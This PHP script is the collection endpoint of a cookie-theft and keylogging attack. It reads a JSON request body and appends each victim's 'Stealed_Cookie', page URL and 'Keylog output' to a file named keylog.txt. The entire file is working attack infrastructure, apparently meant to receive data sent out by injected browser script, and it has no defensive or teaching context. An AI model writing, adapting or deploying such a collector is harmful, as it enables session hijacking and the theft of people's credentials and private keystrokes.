<?php

$data = json_decode(file_get_contents('php://input'), true);


$file = fopen('keylog.txt', 'a');


fwrite($file, "========================================\n");
fwrite($file, "Stealed_Cookie:{$data['Stealed_Cookie']}\n");
fwrite($file, "URL:{$data['URL']}\n");
fwrite($file, "Keylog output:\n[{$data['Keylog output']}]\n");
fwrite($file, "========================================\n");


fclose($file);
?>
